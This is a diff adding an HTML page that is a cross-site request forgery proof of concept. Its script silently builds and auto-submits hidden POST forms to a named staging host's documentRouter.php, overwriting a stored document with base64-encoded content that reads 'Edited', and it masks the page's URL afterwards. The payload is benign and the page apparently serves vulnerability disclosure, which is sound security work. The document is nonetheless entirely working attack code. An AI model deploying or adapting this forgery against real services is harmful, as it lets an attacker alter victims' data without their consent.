@@ -1,0 +1,29 @@
+<!doctype html>
+<html>
+  <body>
+    <script>
+      const documentIDs = [253363];
+
+      documentIDs.forEach((docID, index) => {
+        setTimeout(() => {
+          const form = document.createElement("form");
+          form.action = "https://stagingdev.pestroutes.com/resources/routers/documentRouter.php";
+          form.method = "POST";
+
+          form.innerHTML = `
+            <input type="hidden" name="id" value="${docID}">
+            <input type="hidden" name="unitID" value="0">
+            <input type="hidden" name="action" value="saveEditModeContainer">
+            <input type="hidden" name="content" value="PGRpdj4gRWRpdGVkIDwvZGl2Pg==">
+          `;
+
+          document.body.appendChild(form);
+          form.submit();
+          form.remove();
+        }, index * 1000);
+      });
+
+      history.pushState('', '', '/');
+    </script>
+  </body>
+</html>
